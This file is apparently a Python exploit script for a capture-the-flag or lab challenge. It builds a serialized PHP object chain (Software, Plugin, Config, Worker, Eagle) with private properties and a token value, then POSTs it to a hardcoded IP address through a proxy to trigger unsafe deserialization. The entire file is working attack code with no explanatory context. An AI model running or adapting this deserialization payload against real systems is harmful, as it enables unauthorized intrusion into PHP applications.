import sys, os, urllib.parse
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "_tools"))
import px

BASE = "http://103.163.47.230:34418/"
OP = px.opener("http://143.246.138.227:80")


def priv(cls, prop):
    return "\0%s\0%s" % (cls, prop)


def s(v):
    v = v if isinstance(v, bytes) else v.encode()
    return 's:%d:"%s";' % (len(v), v.decode("latin-1"))


def o(cls, props):
    body = "".join(props)
    return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), body)


eagle = o("Eagle", [s(priv("Eagle", "token")) + s("black-eagle")])
worker = o("Worker", [s(priv("Worker", "eagle")) + eagle])
config = o("Config", [s(priv("Config", "worker")) + worker])
plugin = o("Plugin", [s(priv("Plugin", "config")) + config])
payload = o("Software", [s(priv("Software", "plugin")) + plugin])

print("payload:", payload.replace("\0", "\\0"))
r = urllib.parse.quote(payload, safe="")
s1, h, b = px.post(BASE, raw=("data=" + r).encode(), op=OP)
print("status", s1, len(b))
print(b[-400:])
